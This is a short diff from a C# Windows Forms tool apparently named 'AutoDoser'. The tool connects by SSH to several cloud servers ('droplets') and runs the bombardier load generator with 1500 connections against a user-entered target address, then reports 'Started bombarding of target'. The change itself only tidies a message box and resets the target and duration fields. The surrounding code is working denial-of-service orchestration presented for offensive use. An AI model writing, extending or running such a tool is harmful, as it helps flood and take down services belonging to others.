@@ -48,20 +48,23 @@ namespace AutoDoser
                     client.Connect();
                     client.RunCommand($"docker run -ti --rm alpine/bombardier -c 1500 -d {duration} -l {targetAdress}");
 
-                    string message = $"Started bombarding of target by {Droplet.IP}";
-                    string caption = $"{Droplet.IP} started";
-                    MessageBoxButtons buttons = MessageBoxButtons.OK;
-                    DialogResult result;
+                    //string message = $"Started bombarding of target by {Droplet.IP}";
+                    //string caption = $"{Droplet.IP} started";
+                    //MessageBoxButtons buttons = MessageBoxButtons.OK;
+                    //DialogResult result;
 
-                    // Displays the MessageBox.
-                    result = MessageBox.Show(message, caption, buttons);
+                    //// Displays the MessageBox.
+                    //result = MessageBox.Show(message, caption, buttons);
+                    MessageBox.Show(text: $"Started bombarding of target by {Droplet.IP}",
+                        caption: $"{Droplet.IP} started",
+                        buttons: MessageBoxButtons.OK);
 
                     client.Disconnect();
                 }
             }
-
-
-
+            targetAdress = String.Empty;
+            duration = String.Empty;
+            Droplets = new List<Droplet>();
         }
 
         private void InputData()
